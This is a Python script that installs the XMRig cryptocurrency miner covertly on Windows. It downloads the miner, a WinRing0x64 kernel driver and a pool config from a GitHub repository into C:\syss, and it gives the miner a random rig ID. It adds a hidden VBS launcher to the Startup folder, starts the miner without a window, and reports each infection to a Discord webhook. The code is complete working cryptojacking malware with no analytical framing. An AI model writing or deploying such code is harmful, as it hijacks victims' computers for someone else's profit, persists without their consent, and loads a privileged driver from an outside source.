import os
import subprocess
import requests
import random
import string
import json
import shutil
import psutil  # To check running processes

# Set developer_mode to True or False to enable/disable print statements
developer_mode = False

# URLs for the files on GitHub
config_url = "https://raw.githubusercontent.com/asdnaxk/bckend/refs/heads/main/config.json"
sys_url = "https://github.com/asdnaxk/bckend/raw/refs/heads/main/WinRing0x64.sys"
xmrig_url = "https://github.com/asdnaxk/bckend/raw/refs/heads/main/xmrig.exe"

# Generate a random 9-character alphanumeric name for the rig-id
def generate_random_rigid():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=9))

# Define the path to the new Sysservice folder in C:/syss
sysservice_folder = "C:\\syss"
os.makedirs(sysservice_folder, exist_ok=True)  # Create the folder if it doesn't exist

# Fixed file names
config_file = os.path.join(sysservice_folder, "config.json")
sys_file = os.path.join(sysservice_folder, "WinRing0x64.sys")
xmrig_file = os.path.join(sysservice_folder, "xmrig.exe")

# Function to download a file
def download_file(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, "wb") as f:
            f.write(response.content)
        if developer_mode:
            print(f"Downloaded: {save_path}")

# Download the WinRing0x64.sys file if it doesn't exist
if not os.path.exists(sys_file):
    download_file(sys_url, sys_file)

# Download the config.json file if it doesn't exist
if not os.path.exists(config_file):
    download_file(config_url, config_file)

# Download the xmrig.exe only if it doesn't exist
if not os.path.exists(xmrig_file):
    download_file(xmrig_url, xmrig_file)

# Download and modify the config.json
response = requests.get(config_url)
if response.status_code == 200:
    config_data = response.json()
    # Modify the rig-id in the pools section
    if "pools" in config_data and len(config_data["pools"]) > 0:
        for pool in config_data["pools"]:
            pool["rig-id"] = generate_random_rigid()
            pool_rig_id = pool["rig-id"]
    # Save the modified config.json
    with open(config_file, "w") as f:
        json.dump(config_data, f, indent=4)
    if developer_mode:
        print(f"Modified and saved config.json with random rig-id: {config_file}")

# Function to check if XMRig is already running
def is_xmrig_running():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'xmrig.exe':
            return True
    return False

# Add XMRig to the Startup folder as a VBS script
startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
vbs_file_path = os.path.join(startup_folder, "start_xmrig.vbs")

# VBS script content to run xmrig.exe silently
vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\\syss\\xmrig.exe", 0, False
Set WshShell = Nothing'''

# Create the VBS file in the Startup folder
with open(vbs_file_path, "w") as vbs_file:
    vbs_file.write(vbs_content)
if developer_mode:
    print(f"VBS script created at: {vbs_file_path}")

# Check if XMRig is already running before attempting to start a new instance
if not is_xmrig_running():
    # Run XMRig hidden (Optional: you can also run it immediately for testing)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hide the console window

    try:
        process = subprocess.Popen(
            [xmrig_file],
            cwd=sysservice_folder,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if developer_mode:
            print(f"XMRig started with PID {process.pid}. It is running in the background.")
        requests.post("https://discord.com/api/webhooks/1322250323963678720/7TiYTachOe6-9Dees8vM8mgga43lvy3wzEnjjzKyaLa-REgDthnCZ5fin37t2OLFOeGH", json={
            "embeds": [
                {
                    "title": "Another One!",
                    "description": f"Rig Id: {pool_rig_id}",
                    "color": 16711680
                }
            ]
        })
    except FileNotFoundError:
        pass
else:
    if developer_mode:
        print("XMRig is already running. No new instance will be started.")
